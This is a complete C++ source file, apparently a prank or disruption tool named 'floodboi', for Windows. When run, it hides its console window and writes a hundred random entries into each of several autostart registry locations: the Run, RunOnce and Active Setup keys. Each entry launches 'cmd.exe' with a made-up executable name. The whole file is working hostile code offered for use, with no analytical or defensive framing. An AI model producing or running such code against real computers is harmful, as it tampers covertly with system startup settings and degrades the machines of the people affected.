// floodboi.cpp : This file contains the 'main' function. Program execution begins and ends there.
// 
// Description : This program floods the windows registers with random junk values.
//
// Author: Jon Bauer (JonBauer123)
// Contributers : Russell Babarsky (landy)

#include "pch.h"
#include <iostream>
#include <string>
#include <Windows.h>

// Defines number of keys to create
#define NUM_OF_KEYS 100

using namespace std;

/*
Returns a randomly generated name between 5-10 characters.
*/
wstring valueNameGen() {
	wstring str = L"";

	int len = rand() % 10 + 5;

	for (int i = 0; i < len; i++) {
		char ch = 'a' + rand() % 26;
		str.append(wstring(1, ch));
	}

	return str;
}


/*
The function spawns the value in the given HKEY register that it is passed.
The hkey must have had an open register for this function to work.

HKEY hkey: the HKEY which the value will be spawned in at.
wstring name: the name of the event that will be spawned.
*/
void spawnValue(HKEY hkey, wstring name) {

	LPCWSTR valuename = name.c_str();

	wstring path = L"C:\\Windows\\System32\\cmd.exe /c ";
	wstring arg = valueNameGen();
	arg.append(L".exe");
	path.append(arg);

	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Spawned: " << name << endl;
	}

}

/*
Floods the register that it was provided and floods 1000 values with random names.

HKEY reg: This is the HKEY of the register you want to flood. (EX: HKEY_LOCAL_MACHINE)
LPCWSTR regPath: This is the path to the register that will be overwritten. (EX: SOFTWARE\\Microsoft)
*/
void floodReg(HKEY reg, LPCWSTR regPath) {

	wcout << "Attempting to flood register: " << regPath << endl;

	HKEY hkey;
	long openCheck = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hkey);
	
	if (openCheck != ERROR_SUCCESS) {
		wcout << "\tERROR: Could not open register " << regPath << endl;
		return;
	}

	cout << "\tRegister openned, flooding now ..." << endl;
	
	for (int i = 0; i < NUM_OF_KEYS; i++) {
		wstring name = valueNameGen();

		spawnValue(hkey, name);
	}
	
	cout << "\tFlooding done." << endl;

	RegCloseKey(hkey);

}

/*
Main hides the console window and calls floodReg to flood the Registers with
random junk programs.
*/
int main()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	floodReg(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
	floodReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
	floodReg(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
	floodReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
	
	floodReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"));
	floodReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Wow6432Node\\Microsoft\\Active Setup\\Installed Components"));
	floodReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Active Setup\\Installed Components"));

	return 0;
}
